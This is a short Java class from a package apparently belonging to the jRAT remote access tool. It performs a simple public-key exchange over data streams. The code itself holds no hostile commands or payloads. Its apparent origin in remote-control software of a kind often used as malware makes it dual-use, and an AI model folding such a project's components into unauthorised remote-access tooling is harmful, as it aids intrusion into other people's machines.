package su.jrat.common.crypto;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.security.KeyPair;
import java.security.PublicKey;

public class KeyExchanger {
	
	private DataInputStream dis;
	private DataOutputStream dos;
	private KeyPair pair;
	private PublicKey remoteKey;
	
	public KeyExchanger(DataInputStream dis, DataOutputStream dos, KeyPair pair) {
		this.dis = dis;
		this.dos = dos;
		this.pair = pair;
	}
	
	public void readRemotePublicKey() throws Exception {
		int len = dis.readInt();
		byte[] key = new byte[len];
		
		dis.readFully(key);
		
		this.remoteKey = KeyUtils.getPublicKey(key);
	}
	
	public void writePublicKey() throws Exception {
		byte[] encoded = pair.getPublic().getEncoded();
		
		dos.writeInt(encoded.length);
		dos.write(encoded);
	}

	public PublicKey getRemoteKey() {
		return remoteKey;
	}

}
